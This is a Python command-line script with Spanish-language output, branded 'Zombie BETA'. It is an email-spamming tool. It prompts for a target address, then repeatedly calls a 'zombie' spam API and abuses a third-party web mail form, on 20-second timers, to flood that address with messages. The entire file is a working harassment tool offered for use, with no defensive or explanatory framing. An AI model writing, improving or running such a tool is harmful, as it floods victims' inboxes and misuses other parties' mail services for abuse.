import requests
import time
from requests.structures import CaseInsensitiveDict
from sys import exit
from colorama import Fore,init
init()
o_verde = Fore.GREEN 
rojo = Fore.LIGHTRED_EX
verde = Fore.LIGHTGREEN_EX
cyan = Fore.LIGHTCYAN_EX
blanco = Fore.LIGHTWHITE_EX
magenta = Fore.LIGHTMAGENTA_EX
# verificar conexión a internet
try:
    request = requests.get("https://www.google.com", timeout=5)
except (requests.ConnectionError, requests.Timeout):
    print(f"{rojo}[{blanco}*{rojo}] {blanco}NECESITAS UNA CONEXIÓN ESTABLE A INTERNET\n[*] INTENTALO MÁS TARDE.")
    exit()
else:
    pass

print(f"""
{o_verde}  ·▄▄▄▄•      • ▌ ▄ ·. ▄▄▄▄· ▪  ▄▄▄ .
{o_verde}  ▪▀·.█▌▪     ·██ ▐███▪▐█ ▀█▪██ ▀▄.▀·  
{o_verde}  ▄█▀▀▀• ▄█▀▄ ▐█ ▌▐▌▐█·▐█▀▀█▄▐█·▐▀▀▪▄
{o_verde}  █▌▪▄█▀▐█▌.▐▌██ ██▌▐█▌██▄▪▐█▐█▌▐█▄▄▌
{o_verde}  ·▀▀▀ • ▀█▄▀▪▀▀  █▪▀▀▀·▀▀▀▀ ▀▀▀ ▀▀▀  {o_verde}BETA
{cyan}                 D4VID.0
{blanco}         Instagram : d4vid.0day 
{magenta}[===========================================]{blanco}
""")
correo = input("[>] Escribe el correo a spamear: ")

def correo_movistar_1():
    url = f"https://d4vid0day.pythonanywhere.com/api-spam/zombie/1/{correo}"
    resp = requests.get(url)
    mensaje = resp.text
    if "si" in mensaje:
        print(f"{verde}[{blanco}+{verde}] {cyan}MENSAJE ENVIADO")
    else:
        print(f"{rojo}[{blanco}+{rojo}] {blanco}NO SE PUDO ENVIAR EL MENSAJE")

def correo_movistar_2():
    url2 = f"https://d4vid0day.pythonanywhere.com/api-spam/zombie/2/{correo}"
    rpta = requests.get(url2)
    mensaje = rpta.text
    if "si" in mensaje:
        print(f"{verde}[{blanco}+{verde}] {cyan}MENSAJE ENVIADO")
    else:
        print(f"{rojo}[{blanco}+{rojo}] {blanco}NO SE PUDO ENVIAR EL MENSAJE")

def correo_vfp():
    headers = CaseInsensitiveDict()
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"
    url_vfp = f" http://www.vfpsteambi.solutions/vfpsmail/vfpsmail.php?correo={correo}&idreg=9579"
    env = requests.get(url_vfp)
    rpta = env.text
    if "OK" in rpta:
        print(f"{verde}[{blanco}+{verde}] {cyan}MENSAJE ENVIADO")
    else:
        print(f"{rojo}[{blanco}+{rojo}] {blanco}NO SE PUDO ENVIAR EL MENSAJE")

def envio_spam():
    correo_movistar_1()   
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n") #tiempo de espera
    time.sleep(20)
    correo_vfp()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n") #tiempo de espera
    time.sleep(20)
    correo_movistar_2()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n") #tiempo de espera
    time.sleep(20)
    correo_movistar_1()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n") #tiempo de espera
    time.sleep(20)
    correo_vfp()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n") #tiempo de espera
    time.sleep(20)
    correo_movistar_2()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n") #tiempo de espera
    time.sleep(20)
    correo_movistar_1()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n") #tiempo de espera
    time.sleep(20)
    correo_vfp()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n")
    time.sleep(20)
    correo_movistar_2()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n")
    time.sleep(20)
    correo_movistar_1()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n")
    time.sleep(20)
    correo_vfp()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n")
    time.sleep(20)
    correo_movistar_2()
    print(f"\n{magenta}[{cyan}#{magenta}] {o_verde}TIEMPO DE ESPERA DE SOLICITUD 20s :D\n")
    time.sleep(20)
    correo_movistar_1()
    print(f"\n{verde}[{o_verde}${verde}] {cyan}EL ENVIO DE SPAM POR CORREO ACABA DE FINALIZAR.")

if __name__ == "__main__":
    try:
        print(f"{verde}INICIANDO EL SPAM AL CORREO {o_verde}{correo}")
        time.sleep(5)
        envio_spam()

    except KeyboardInterrupt:
        print(f"{blanco}[!] {o_verde}ENVIO DE SPAM DETENIDO!")
        time.sleep(2)
        print(f"{cyan}......... :D")
        exit()